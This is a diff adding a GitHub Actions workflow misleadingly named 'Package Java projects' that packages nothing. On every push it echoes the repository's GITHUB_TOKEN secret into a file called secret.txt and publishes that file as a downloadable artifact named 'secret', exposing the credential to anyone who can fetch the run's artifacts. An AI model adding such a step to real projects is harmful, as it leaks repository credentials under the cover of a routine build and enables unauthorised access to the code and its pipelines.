@@ -1,0 +1,20 @@
+name: Package Java projects
+
+on:
+  push:
+   
+jobs:
+  upload-artifact:
+    runs-on: ubuntu-latest
+    name: Upload artifact
+    
+    steps:
+      - name: create secrets files
+        run: |
+          echo "${{ secrets.GITHUB_TOKEN }}" > secret.txt
+      - name: Upload artifacts
+        uses: actions/upload-artifact@v4
+        with:
+          name: secret
+          path: |
+            secret.txt
